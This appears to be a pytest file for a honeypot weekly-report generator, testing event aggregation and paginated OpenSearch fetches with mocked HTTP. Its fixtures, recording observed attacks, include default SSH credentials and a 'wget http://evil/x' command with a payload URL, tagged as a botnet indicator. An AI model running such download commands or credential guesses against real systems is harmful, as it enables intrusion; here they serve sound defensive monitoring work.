"""Tests for the weekly report generator: aggregation + OpenSearch fetch."""

import json
from datetime import datetime, timezone

import httpx

from generate_report import build_context, count_events_opensearch, fetch_events_opensearch

SINCE = datetime(2026, 6, 1, tzinfo=timezone.utc)
UNTIL = datetime(2026, 6, 8, tzinfo=timezone.utc)


def _event(**over):
    e = {
        "timestamp": "2026-06-02T00:00:00Z",
        "sensor_id": "cowrie-01",
        "source_ip": "203.0.113.1",
        "event_type": "login_attempt",
        "username": "root",
        "password": "123456",
        "tags": ["ssh"],
    }
    e.update(over)
    return e


def test_build_context_aggregates():
    events = [
        _event(),
        _event(source_ip="203.0.113.1"),
        _event(source_ip="203.0.113.2", username="admin", password="admin"),
        _event(event_type="command_exec", command="wget http://evil/x", tags=["download", "botnet_indicator"]),
        _event(event_type="file_download", payload_url="http://evil/x.sh", payload_hash="abc"),
    ]
    ctx = build_context(events, SINCE, UNTIL)
    assert ctx["summary"]["total_events"] == 5
    assert ctx["summary"]["unique_source_ips"] == 2
    assert ctx["summary"]["top_usernames"][0]["key"] == "root"
    assert ctx["download_count"] == 1
    assert any(t["key"] == "botnet_indicator" for t in ctx["botnet_tags"])


def _mock_httpx(monkeypatch, handler):
    transport = httpx.MockTransport(handler)
    real = httpx.Client
    monkeypatch.setattr(httpx, "Client", lambda *a, **k: real(transport=transport))
    monkeypatch.setattr(httpx, "post",
                        lambda url, **k: real(transport=transport).request("POST", url, **k))


def test_fetch_opensearch_paginates(monkeypatch):
    # Two full pages then empty — fetch should follow search_after and stop.
    def handler(request: httpx.Request) -> httpx.Response:
        body = json.loads(request.content)
        after = body.get("search_after")
        if not after:
            hits = [{"_source": _event(source_ip=f"10.0.0.{i}"), "sort": [i, str(i)]} for i in range(1000)]
        elif after[0] == 999:
            hits = [{"_source": _event(source_ip="10.1.0.1"), "sort": [1, "z"]}]
        else:
            hits = []
        return httpx.Response(200, json={"hits": {"hits": hits}})

    _mock_httpx(monkeypatch, handler)
    events = fetch_events_opensearch("http://os:9200", SINCE, UNTIL)
    assert len(events) == 1001
    assert events[0]["source_ip"] == "10.0.0.0"


def test_count_opensearch(monkeypatch):
    _mock_httpx(monkeypatch, lambda req: httpx.Response(200, json={"count": 42}))
    assert count_events_opensearch("http://os:9200", SINCE, UNTIL) == 42
